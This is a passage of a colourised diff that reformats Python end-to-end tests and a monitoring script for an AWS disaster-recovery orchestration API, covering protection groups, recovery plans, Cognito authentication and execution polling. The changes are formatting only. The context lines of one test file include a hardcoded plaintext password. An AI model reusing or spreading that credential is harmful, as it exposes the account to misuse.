API_ENDPOINT]:\u001b[0m\n\u001b[32m+    if \"UPDATE_ME\" in [USER_POOL_ID, CLIENT_ID, API_ENDPOINT]:\u001b[0m\n         print(\"\\n\u274c ERROR: Update config variables at top of file\")\n         print(\"   Get values from: aws cloudformation describe-stacks\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Authenticate\n     print(\"\\n\ud83d\udcdd Step 1: Authentication\")\n     token = get_auth_token()\n     if not token:\n         return False\n     print(\"\u2705 Authenticated successfully\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test CRUD operations\n     results = []\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # CREATE\n     pg_id, pg_name = test_create_protection_group(token)\n\u001b[31m-    results.append(('CREATE', pg_id is not None))\u001b[0m\n\u001b[32m+    results.append((\"CREATE\", pg_id is not None))\u001b[0m\n     if not pg_id:\n         print(\"\\n\u274c Cannot continue - CREATE failed\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # GET\n\u001b[31m-    results.append(('GET', test_get_protection_group(token, pg_id)))\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    results.append((\"GET\", test_get_protection_group(token, pg_id)))\u001b[0m\n\u001b[32m+\u001b[0m\n     # UPDATE (PUT)\n\u001b[31m-    results.append(('UPDATE', test_update_protection_group(token, pg_id)))\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    results.append((\"UPDATE\", test_update_protection_group(token, pg_id)))\u001b[0m\n\u001b[32m+\u001b[0m\n     # Name Uniqueness\n\u001b[31m-    results.append(('UNIQUENESS', test_name_uniqueness(token, pg_name)))\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    results.append((\"UNIQUENESS\", test_name_uniqueness(token, pg_name)))\u001b[0m\n\u001b[32m+\u001b[0m\n     # DELETE\n\u001b[31m-    results.append(('DELETE', test_delete_protection_group(token, pg_id)))\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    results.append((\"DELETE\", test_delete_protection_group(token, pg_id)))\u001b[0m\n\u001b[32m+\u001b[0m\n     # Summary\n     print(\"\\n\" + \"=\" * 60)\n     print(\"TEST RESULTS SUMMARY\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     for test_name, passed in results:\n         status = \"\u2705 PASS\" if passed else \"\u274c FAIL\"\n         print(f\"{status}: {test_name}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     all_passed = all(result[1] for result in results)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\" + \"=\" * 60)\n     if all_passed:\n         print(\"\ud83c\udf89 ALL TESTS PASSED\")\n         print(\"=\" * 60)\n         return True\n     else:\n         print(\"\u274c SOME TESTS FAILED\")\n         print(\"=\" * 60)\n         return False\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     success = main()\n     sys.exit(0 if success else 1)\n\u001b[1m--- tests/python/e2e/test_recovery_plan_api_crud.py\t2025-11-21 02:56:07.794299+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/test_recovery_plan_api_crud.py\t2026-01-02 15:49:03.492180+00:00\u001b[0m\n\u001b[36m@@ -23,169 +23,198 @@\u001b[0m\n PASSWORD = \"IiG2b1o+D$\"\n \n \n class CognitoAuthenticator:\n     \"\"\"Handles Cognito authentication\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def __init__(self):\n\u001b[31m-        self.client = boto3.client('cognito-idp', region_name=REGION)\u001b[0m\n\u001b[32m+        self.client = boto3.client(\"cognito-idp\", region_name=REGION)\u001b[0m\n         self.id_token = None\n         self.access_token = None\n\u001b[31m-        \u001b[0m\n\u001b[31m-    def authenticate(self, username: str, password: str, client_id: str) -> Dict[str, str]:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def authenticate(\u001b[0m\n\u001b[32m+        self, username: str, password: str, client_id: str\u001b[0m\n\u001b[32m+    ) -> Dict[str, str]:\u001b[0m\n         \"\"\"Authenticate user and get tokens\"\"\"\n         # Initiate auth\n         auth_response = self.client.initiate_auth(\n             ClientId=client_id,\n\u001b[31m-            AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-            AuthParameters={\u001b[0m\n\u001b[31m-                'USERNAME': username,\u001b[0m\n\u001b[31m-                'PASSWORD': password\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        self.id_token = auth_response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-        self.access_token = auth_response['AuthenticationResult']['AccessToken']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+            AuthParameters={\"USERNAME\": username, \"PASSWORD\": password},\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        self.id_token = auth_response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+        self.access_token = auth_response[\"AuthenticationResult\"][\u001b[0m\n\u001b[32m+            \"AccessToken\"\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         return {\n\u001b[31m-            'Authorization': self.id_token,\u001b[0m\n\u001b[31m-            'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+            \"Authorization\": self.id_token,\u001b[0m\n\u001b[32m+            \"Content-Type\": \"application/json\",\u001b[0m\n         }\n \n \n class RecoveryPlanAPITester:\n     \"\"\"Tests Recovery Plan CRUD operations via API\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def __init__(self, api_endpoint: str, headers: Dict[str, str]):\n         self.api_endpoint = api_endpoint\n         self.headers = headers\n         self.created_pg_ids = []\n         self.created_plan_id = None\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     def create_protection_group(self, name: str, num_servers: int) -> str:\n         \"\"\"Create a Protection Group with mock servers\"\"\"\n         # Generate mock server IDs\n\u001b[31m-        server_ids = [f\"i-{name.lower()}{i:03d}\" for i in range(1, num_servers + 1)]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        server_ids = [\u001b[0m\n\u001b[32m+            f\"i-{name.lower()}{i:03d}\" for i in range(1, num_servers + 1)\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         payload = {\n             \"GroupName\": name,\n             \"Region\": REGION,\n             \"Description\": f\"Test Protection Group for {name}\",\n             \"AccountId\": \"123456789012\",  # Required by deployed API\n\u001b[31m-            \"sourceServerIds\": server_ids\u001b[0m\n\u001b[32m+            \"sourceServerIds\": server_ids,\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = requests.post(\n             f\"{self.api_endpoint}/protection-groups\",\n             headers=self.headers,\n\u001b[31m-            json=payload\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert response.status_code == 201, f\"Failed to create PG {name}: {response.text}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            json=payload,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            response.status_code == 201\u001b[0m\n\u001b[32m+        ), f\"Failed to create PG {name}: {response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n         pg_data = response.json()\n\u001b[31m-        pg_id = pg_data.get('protectionGroupId') or pg_data.get('id') or pg_data.get('GroupId')\u001b[0m\n\u001b[32m+        pg_id = (\u001b[0m\n\u001b[32m+            pg_data.get(\"protectionGroupId\")\u001b[0m\n\u001b[32m+            or pg_data.get(\"id\")\u001b[0m\n\u001b[32m+            or pg_data.get(\"GroupId\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n         assert pg_id, f\"No ID in response: {pg_data}\"\n         self.created_pg_ids.append(pg_id)\n\u001b[31m-        \u001b[0m\n\u001b[31m-        print(f\"\u2705 Created Protection Group: {name} ({pg_id}) with {num_servers} servers\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\u2705 Created Protection Group: {name} ({pg_id}) with {num_servers} servers\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         return pg_id\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     def create_recovery_plan(self, plan_name: str, waves: List[Dict]) -> str:\n         \"\"\"Create a Recovery Plan with multiple waves\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             plan_name: Name of the recovery plan\n             waves: List of wave configurations, each with:\n                    - name: Wave name\n                    - pg_id: Protection Group ID\n                    - server_ids: List of server IDs to include\n         \"\"\"\n         wave_configs = []\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in waves:\n             wave_config = {\n\u001b[31m-                \"waveNumber\": wave.get('order', len(wave_configs) + 1),\u001b[0m\n\u001b[31m-                \"name\": wave['name'],\u001b[0m\n\u001b[31m-                \"protectionGroupId\": wave['pg_id'],\u001b[0m\n\u001b[31m-                \"serverIds\": wave['server_ids'],\u001b[0m\n\u001b[31m-                \"launchOrder\": wave.get('order', len(wave_configs) + 1)\u001b[0m\n\u001b[32m+                \"waveNumber\": wave.get(\"order\", len(wave_configs) + 1),\u001b[0m\n\u001b[32m+                \"name\": wave[\"name\"],\u001b[0m\n\u001b[32m+                \"protectionGroupId\": wave[\"pg_id\"],\u001b[0m\n\u001b[32m+                \"serverIds\": wave[\"server_ids\"],\u001b[0m\n\u001b[32m+                \"launchOrder\": wave.get(\"order\", len(wave_configs) + 1),\u001b[0m\n             }\n             wave_configs.append(wave_config)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         payload = {\n             \"PlanName\": plan_name,\n             \"Description\": f\"Test recovery plan - {plan_name}\",\n             \"AccountId\": \"123456789012\",\n             \"Region\": REGION,\n             \"Owner\": USERNAME,\n\u001b[31m-            \"Waves\": wave_configs\u001b[0m\n\u001b[32m+            \"Waves\": wave_configs,\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = requests.post(\n             f\"{self.api_endpoint}/recovery-plans\",\n             headers=self.headers,\n\u001b[31m-            json=payload\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert response.status_code == 201, f\"Failed to create plan: {response.text}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            json=payload,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            response.status_code == 201\u001b[0m\n\u001b[32m+        ), f\"Failed to create plan: {response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n         plan_data = response.json()\n         print(f\"  DEBUG - API Response: {json.dumps(plan_data, indent=2)}\")\n\u001b[31m-        self.created_plan_id = plan_data.get('PlanId') or plan_data.get('id') or plan_data.get('planId')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert self.created_plan_id, f\"No plan ID in response! Keys: {list(plan_data.keys())}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        print(f\"\u2705 Created Recovery Plan: {plan_name} ({self.created_plan_id}) with {len(waves)} waves\")\u001b[0m\n\u001b[32m+        self.created_plan_id = (\u001b[0m\n\u001b[32m+            plan_data.get(\"PlanId\")\u001b[0m\n\u001b[32m+            or plan_data.get(\"id\")\u001b[0m\n\u001b[32m+            or plan_data.get(\"planId\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            self.created_plan_id\u001b[0m\n\u001b[32m+        ), f\"No plan ID in response! Keys: {list(plan_data.keys())}\"\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\u2705 Created Recovery Plan: {plan_name} ({self.created_plan_id}) with {len(waves)} waves\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         return self.created_plan_id\n\u001b[31m-        \u001b[0m\n\u001b[31m-    def update_recovery_plan(self, plan_id: str, updated_waves: List[Dict]) -> Dict:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def update_recovery_plan(\u001b[0m\n\u001b[32m+        self, plan_id: str, updated_waves: List[Dict]\u001b[0m\n\u001b[32m+    ) -> Dict:\u001b[0m\n         \"\"\"Update a Recovery Plan by modifying wave configurations\"\"\"\n\u001b[31m-        payload = {\u001b[0m\n\u001b[31m-            \"waves\": updated_waves\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        payload = {\"waves\": updated_waves}\u001b[0m\n\u001b[32m+\u001b[0m\n         response = requests.put(\n             f\"{self.api_endpoint}/recovery-plans/{plan_id}\",\n             headers=self.headers,\n\u001b[31m-            json=payload\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert response.status_code == 200, f\"Failed to update plan: {response.text}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            json=payload,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            response.status_code == 200\u001b[0m\n\u001b[32m+        ), f\"Failed to update plan: {response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"\u2705 Updated Recovery Plan: {plan_id}\")\n         return response.json()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     def delete_recovery_plan(self, plan_id: str) -> None:\n         \"\"\"Delete a Recovery Plan\"\"\"\n         response = requests.delete(\n             f\"{self.api_endpoint}/recovery-plans/{plan_id}\",\n\u001b[31m-            headers=self.headers\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert response.status_code == 200, f\"Failed to delete plan: {response.text}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            headers=self.headers,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            response.status_code == 200\u001b[0m\n\u001b[32m+        ), f\"Failed to delete plan: {response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"\u2705 Deleted Recovery Plan: {plan_id}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     def cleanup_protection_groups(self) -> None:\n         \"\"\"Clean up created Protection Groups\"\"\"\n         for pg_id in self.created_pg_ids:\n             response = requests.delete(\n                 f\"{self.api_endpoint}/protection-groups/{pg_id}\",\n\u001b[31m-                headers=self.headers\u001b[0m\n\u001b[32m+                headers=self.headers,\u001b[0m\n             )\n             if response.status_code == 200:\n                 print(f\"\u2705 Deleted Protection Group: {pg_id}\")\n             else:\n\u001b[31m-                print(f\"\u26a0\ufe0f  Failed to delete Protection Group {pg_id}: {response.text}\")\u001b[0m\n\u001b[32m+                print(\u001b[0m\n\u001b[32m+                    f\"\u26a0\ufe0f  Failed to delete Protection Group {pg_id}: {response.text}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n \n \n @pytest.fixture(scope=\"module\")\n def auth_headers():\n     \"\"\"Authenticate and get headers for API requests\"\"\"\n     authenticator = CognitoAuthenticator()\n\u001b[31m-    headers = authenticator.authenticate(USERNAME, PASSWORD, USER_POOL_CLIENT_ID)\u001b[0m\n\u001b[32m+    headers = authenticator.authenticate(\u001b[0m\n\u001b[32m+        USERNAME, PASSWORD, USER_POOL_CLIENT_ID\u001b[0m\n\u001b[32m+    )\u001b[0m\n     return headers\n \n \n @pytest.fixture(scope=\"module\")\n def api_tester(auth_headers):\n\u001b[36m@@ -202,104 +231,113 @@\u001b[0m\n     1. Create Recovery Plan with 3 waves\n     2. Edit plan by removing one server from each wave\n     3. Delete Recovery Plan\n     \"\"\"\n     import time\n\u001b[32m+\u001b[0m\n     timestamp = int(time.time())\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # ========================================================================\n     # PART 1: Create Recovery Plan with 3 Waves\n     # ========================================================================\n\u001b[31m-    print(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+    print(\"\\n\" + \"=\" * 80)\u001b[0m\n     print(\"PART 1: Create Recovery Plan with 3 Waves\")\n\u001b[31m-    print(\"=\"*80)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+\u001b[0m\n     # Create Protection Groups\n\u001b[31m-    web_pg_id = api_tester.create_protection_group(f\"WebServers-{timestamp}\", 2)\u001b[0m\n\u001b[31m-    app_pg_id = api_tester.create_protection_group(f\"AppServers-{timestamp}\", 2)\u001b[0m\n\u001b[31m-    db_pg_id = api_tester.create_protection_group(f\"DatabaseServers-{timestamp}\", 2)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    web_pg_id = api_tester.create_protection_group(\u001b[0m\n\u001b[32m+        f\"WebServers-{timestamp}\", 2\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    app_pg_id = api_tester.create_protection_group(\u001b[0m\n\u001b[32m+        f\"AppServers-{timestamp}\", 2\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    db_pg_id = api_tester.create_protection_group(\u001b[0m\n\u001b[32m+        f\"DatabaseServers-{timestamp}\", 2\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     # Define waves with all servers from each PG\n     waves = [\n         {\n             \"name\": \"Web\",\n             \"pg_id\": web_pg_id,\n             \"server_ids\": [\"i-webservers001\", \"i-webservers002\"],\n\u001b[31m-            \"order\": 1\u001b[0m\n\u001b[32m+            \"order\": 1,\u001b[0m\n         },\n         {\n             \"name\": \"App\",\n             \"pg_id\": app_pg_id,\n             \"server_ids\": [\"i-appservers001\", \"i-appservers002\"],\n\u001b[31m-            \"order\": 2\u001b[0m\n\u001b[32m+            \"order\": 2,\u001b[0m\n         },\n         {\n             \"name\": \"Database\",\n             \"pg_id\": db_pg_id,\n             \"server_ids\": [\"i-databaseservers001\", \"i-databaseservers002\"],\n\u001b[31m-            \"order\": 3\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+            \"order\": 3,\u001b[0m\n\u001b[32m+        },\u001b[0m\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Create Recovery Plan\n     plan_id = api_tester.create_recovery_plan(f\"TEST-{timestamp}\", waves)\n     assert plan_id is not None, \"Failed to create Recovery Plan\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\u2705 PART 1 PASSED: Recovery Plan created\")\n     print(f\"   Plan ID: {plan_id}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # ========================================================================\n     # PART 2: Edit Plan - Remove One Server from Each Wave\n     # ========================================================================\n\u001b[31m-    print(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+    print(\"\\n\" + \"=\" * 80)\u001b[0m\n     print(\"PART 2: Edit Plan - Remove One Server from Each Wave\")\n\u001b[31m-    print(\"=\"*80)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+\u001b[0m\n     # Updated waves with one server removed from each\n     updated_waves = [\n         {\n             \"waveName\": \"Web\",\n             \"protectionGroupId\": web_pg_id,\n             \"serverIds\": [\"i-webservers001\"],  # Removed i-webservers002\n\u001b[31m-            \"launchOrder\": 1\u001b[0m\n\u001b[32m+            \"launchOrder\": 1,\u001b[0m\n         },\n         {\n             \"waveName\": \"App\",\n             \"protectionGroupId\": app_pg_id,\n             \"serverIds\": [\"i-appservers001\"],  # Removed i-appservers002\n\u001b[31m-            \"launchOrder\": 2\u001b[0m\n\u001b[32m+            \"launchOrder\": 2,\u001b[0m\n         },\n         {\n             \"waveName\": \"Database\",\n             \"protectionGroupId\": db_pg_id,\n\u001b[31m-            \"serverIds\": [\"i-databaseservers001\"],  # Removed i-databaseservers002\u001b[0m\n\u001b[31m-            \"launchOrder\": 3\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+            \"serverIds\": [\u001b[0m\n\u001b[32m+                \"i-databaseservers001\"\u001b[0m\n\u001b[32m+            ],  # Removed i-databaseservers002\u001b[0m\n\u001b[32m+            \"launchOrder\": 3,\u001b[0m\n\u001b[32m+        },\u001b[0m\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Update plan\n     updated_plan = api_tester.update_recovery_plan(plan_id, updated_waves)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\u2705 PART 2 PASSED: Recovery Plan updated\")\n     print(f\"   Updated: Web (1 server), App (1 server), Database (1 server)\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # ========================================================================\n     # PART 3: Delete Recovery Plan\n     # ========================================================================\n\u001b[31m-    print(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+    print(\"\\n\" + \"=\" * 80)\u001b[0m\n     print(\"PART 3: Delete Recovery Plan\")\n\u001b[31m-    print(\"=\"*80)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+\u001b[0m\n     # Delete plan\n     api_tester.delete_recovery_plan(plan_id)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\u2705 PART 3 PASSED: Recovery Plan deleted\")\n     print(f\"   Deleted Plan ID: {plan_id}\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    print(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    print(\"\\n\" + \"=\" * 80)\u001b[0m\n     print(\"\u2705 ALL TESTS PASSED: Complete Recovery Plan Lifecycle\")\n\u001b[31m-    print(\"=\"*80)\u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n \n \n if __name__ == \"__main__\":\n     # Run tests directly\n     pytest.main([__file__, \"-v\", \"-s\"])\n\u001b[1m--- scripts/monitor_lambda_drill.py\t2025-12-31 23:24:52.689952+00:00\u001b[0m\n\u001b[1m+++ scripts/monitor_lambda_drill.py\t2026-01-02 15:49:03.509578+00:00\u001b[0m\n\u001b[36m@@ -4,101 +4,142 @@\u001b[0m\n \"\"\"\n import boto3\n import time\n import sys\n \n\u001b[32m+\u001b[0m\n def monitor_execution(execution_id, plan_id, max_wait_minutes=10):\n     \"\"\"Monitor execution until completion or timeout\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    dynamodb = boto3.client('dynamodb', region_name='us-east-1')\u001b[0m\n\u001b[31m-    drs = boto3.client('drs', region_name='us-east-1')\u001b[0m\n\u001b[31m-    ec2 = boto3.client('ec2', region_name='us-east-1')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    dynamodb = boto3.client(\"dynamodb\", region_name=\"us-east-1\")\u001b[0m\n\u001b[32m+    drs = boto3.client(\"drs\", region_name=\"us-east-1\")\u001b[0m\n\u001b[32m+    ec2 = boto3.client(\"ec2\", region_name=\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\ud83d\udd0d Monitoring execution: {execution_id}\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     start_time = time.time()\n     max_wait_seconds = max_wait_minutes * 60\n     job_id = None\n     source_server_id = None\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     while (time.time() - start_time) < max_wait_seconds:\n         try:\n             # Validate input parameters\n\u001b[31m-            if not execution_id or not isinstance(execution_id, str) or len(execution_id) > 100:\u001b[0m\n\u001b[32m+            if (\u001b[0m\n\u001b[32m+                not execution_id\u001b[0m\n\u001b[32m+                or not isinstance(execution_id, str)\u001b[0m\n\u001b[32m+                or len(execution_id) > 100\u001b[0m\n\u001b[32m+            ):\u001b[0m\n                 print(\"\u274c Invalid execution_id\")\n                 return False\n\u001b[31m-            if not plan_id or not isinstance(plan_id, str) or len(plan_id) > 100:\u001b[0m\n\u001b[32m+            if (\u001b[0m\n\u001b[32m+                not plan_id\u001b[0m\n\u001b[32m+                or not isinstance(plan_id, str)\u001b[0m\n\u001b[32m+                or len(plan_id) > 100\u001b[0m\n\u001b[32m+            ):\u001b[0m\n                 print(\"\u274c Invalid plan_id\")\n                 return False\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Get execution status\n             response = dynamodb.get_item(\n\u001b[31m-                TableName='drs-orchestration-execution-history-test',\u001b[0m\n\u001b[32m+                TableName=\"drs-orchestration-execution-history-test\",\u001b[0m\n                 Key={\n\u001b[31m-                    'ExecutionId': {'S': str(execution_id)[:100]},\u001b[0m\n\u001b[31m-                    'PlanId': {'S': str(plan_id)[:100]}\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[32m+                    \"ExecutionId\": {\"S\": str(execution_id)[:100]},\u001b[0m\n\u001b[32m+                    \"PlanId\": {\"S\": str(plan_id)[:100]},\u001b[0m\n\u001b[32m+                },\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if 'Item' not in response:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if \"Item\" not in response:\u001b[0m\n                 print(\"\u274c Execution not found\")\n                 return False\n\u001b[31m-            \u001b[0m\n\u001b[31m-            item = response['Item']\u001b[0m\n\u001b[31m-            status = item.get('Status', {}).get('S', 'UNKNOWN')\u001b[0m\n\u001b[31m-            waves = item.get('Waves', {}).get('L', [])\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            item = response[\"Item\"]\u001b[0m\n\u001b[32m+            status = item.get(\"Status\", {}).get(\"S\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+            waves = item.get(\"Waves\", {}).get(\"L\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n             if waves:\n\u001b[31m-                wave = waves[0].get('M', {})\u001b[0m\n\u001b[31m-                wave_status = wave.get('Status', {}).get('S', 'UNKNOWN')\u001b[0m\n\u001b[31m-                job_id = wave.get('JobId', {}).get('S')\u001b[0m\n\u001b[31m-                servers = wave.get('Servers', {}).get('L', [])\u001b[0m\n\u001b[32m+                wave = waves[0].get(\"M\", {})\u001b[0m\n\u001b[32m+                wave_status = wave.get(\"Status\", {}).get(\"S\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                job_id = wave.get(\"JobId\", {}).get(\"S\")\u001b[0m\n\u001b[32m+                servers = wave.get(\"Servers\", {}).get(\"L\", [])\u001b[0m\n                 if servers:\n\u001b[31m-                    source_server_id = servers[0].get('M', {}).get('SourceServerId', {}).get('S')\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    source_server_id = (\u001b[0m\n\u001b[32m+                        servers[0]\u001b[0m\n\u001b[32m+                        .get(\"M\", {})\u001b[0m\n\u001b[32m+                        .get(\"SourceServerId\", {})\u001b[0m\n\u001b[32m+                        .get(\"S\")\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n                 elapsed = int(time.time() - start_time)\n\u001b[31m-                print(f\"[{elapsed}s] Execution: {status}, Wave: {wave_status}, Job: {job_id or 'N/A'}\")\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                print(\u001b[0m\n\u001b[32m+                    f\"[{elapsed}s] Execution: {status}, Wave: {wave_status}, Job: {job_id or 'N/A'}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check if job completed\n\u001b[31m-                if job_id and wave_status in ['COMPLETED', 'FAILED']:\u001b[0m\n\u001b[32m+                if job_id and wave_status in [\"COMPLETED\", \"FAILED\"]:\u001b[0m\n                     print(f\"\\n\u2705 Wave {wave_status}!\")\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     # Check for EC2 instances\n                     if source_server_id:\n\u001b[31m-                        print(f\"\\n\ud83d\udd0d Checking for EC2 instances (source: {source_server_id})...\")\u001b[0m\n\u001b[32m+                        print(\u001b[0m\n\u001b[32m+                            f\"\\n\ud83d\udd0d Checking for EC2 instances (source: {source_server_id})...\"\u001b[0m\n\u001b[32m+                        )\u001b[0m\n                         instances = ec2.describe_instances(\n                             Filters=[\n\u001b[31m-                                {'Name': 'tag:AWSElasticDisasterRecoverySourceServerID', 'Values': [source_server_id]},\u001b[0m\n\u001b[31m-                                {'Name': 'instance-state-name', 'Values': ['pending', 'running']}\u001b[0m\n\u001b[32m+                                {\u001b[0m\n\u001b[32m+                                    \"Name\": \"tag:AWSElasticDisasterRecoverySourceServerID\",\u001b[0m\n\u001b[32m+                                    \"Values\": [source_server_id],\u001b[0m\n\u001b[32m+                                },\u001b[0m\n\u001b[32m+                                {\u001b[0m\n\u001b[32m+                                    \"Name\": \"instance-state-name\",\u001b[0m\n\u001b[32m+                                    \"Values\": [\"pending\", \"running\"],\u001b[0m\n\u001b[32m+                                },\u001b[0m\n                             ]\n                         )\n\u001b[31m-           